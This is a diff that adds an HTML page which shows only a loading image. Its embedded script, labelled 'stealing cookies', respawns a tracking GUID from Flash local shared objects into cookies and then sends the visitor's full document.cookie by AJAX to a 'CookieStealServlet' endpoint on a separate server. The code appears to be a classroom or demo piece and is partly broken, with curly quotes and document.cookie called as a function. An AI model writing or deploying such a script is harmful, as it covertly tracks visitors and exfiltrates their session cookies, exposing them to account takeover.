@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<body>
+	<img src="../images/loader.gif">
+	<script>
+	/*
+	*web tracking with Flah FLOs
+	*/
+	
+	//get FLOS
+	//transform FLOS into cookies
+	
+	var _local2 = flash.external.ExternalInterface.call(“getCookie”, “guid”);
+		console.log(_local2);
+	if (_local2 == undefined) {
+		_local2 = getComputerguidFromFSO();
+		console.log(_local2);
+		if (_local2 != undefined) {
+			flash.external.ExternalInterface.call(“setCookie”,“guid”, _local2);
+			console.log(document.cookie("guid"));
+		}	
+	}
+	else {
+		setComputerguidInFSO(_local2);
+		}
+	/*
+	*stealing cookies
+	*/
+	console.log('cookie: ' + document.cookie);
+	//copie cookies into variable cookies
+	var cookies = document.cookie;
+	
+	//sends cookies to MusExpress server
+	$.ajax({
+		type : "GET",
+		url : "CookieStealServlet", //add complete URL
+		data : cookies,
+	
+		dataType : "json",
+		success : function(data) { 
+			console.log(data.message);
+		},
+		error : function(XHR, testStatus, errorThrown) 
+		{
+	
+		}
+	});
+
+</script>
+
+</body>
+</html>
